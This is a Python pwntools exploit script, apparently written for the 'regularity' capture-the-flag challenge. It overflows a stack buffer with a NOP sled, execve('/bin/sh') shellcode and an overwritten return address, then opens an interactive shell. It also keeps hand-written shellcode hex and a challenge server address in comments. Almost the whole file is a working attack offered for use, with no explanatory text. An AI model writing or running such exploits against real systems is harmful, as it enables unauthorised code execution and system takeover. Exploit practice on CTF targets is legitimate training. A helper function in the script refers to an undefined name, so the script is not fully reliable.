#!/usr/bin/env python3

from pwn import *

exe = ELF("regularity_patched", checksec=False)

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h', '-p', '70', '-I']
context.log_level 	= "WARNING"
# context.log_level 	= "DEBUG"
isDebug = False
shouldPrint = True

gs = '''
break _start
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug([exe.path], gdbscript=gs)
	else:
		return process([exe.path], *a, **kw)
		
def find_ip_offset(payload):
	io = process(elf.path)
	io.sendlineafter(b": ", payload)
	
	io.wait()
	
	#ip_offset = cyclic_find(io.corefile.pc) # x86
	ip_offset = cyclic_find(io.corefile.read(io.corefile.sp, 4))
	info("Located RIP offset at [%s]", ip_offset)
	return ip_offset

def print_result(result):
	if shouldPrint:
		print(result)
  
def exploit(payload:bytes):
    io.sendlineafter(b"\n", payload)
		
#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================

######## LOCAL ########
# ip_offset = find_ip_offset(cyclic(200))
# ip_offset = 56
io = start_local(isDebug)
offset = 256
######## REMOTE ########
# remote_address = "94.237.57.115:44915"
# io = remote(remote_address.split(":")[0], int(remote_address.split(":")[1]))
io.timeout = 0.1

# shellcode = bytes.fromhex(
#     "f30f1efa"          # ENDBR64
#     "31d2"              # xor edx, edx
#     "48bb2f62696e2f736800"  # mov rbx, 0x0068732f6e69622f
#     "53"                # push rbx
#     "4889e7"            # mov rdi, rsp
#     "52"                # push rdx
#     "57"                # push rdi
#     "4889e6"            # mov rsi, rsp
#     "31c0"              # xor eax, eax
#     "b03b"              # mov al, 0x3b
#     "0f05"              # syscall
# )

shellcode = asm(shellcraft.execve('/bin/sh'))

payload = flat(
    b"\x90"* 16,
	shellcode,
	b"f" * (256 - len(shellcode) - 16),
 	p64(0x0000000000401041),
	p64(0x7fffffffda48),
	
)

exploit(payload)

io.interactive()
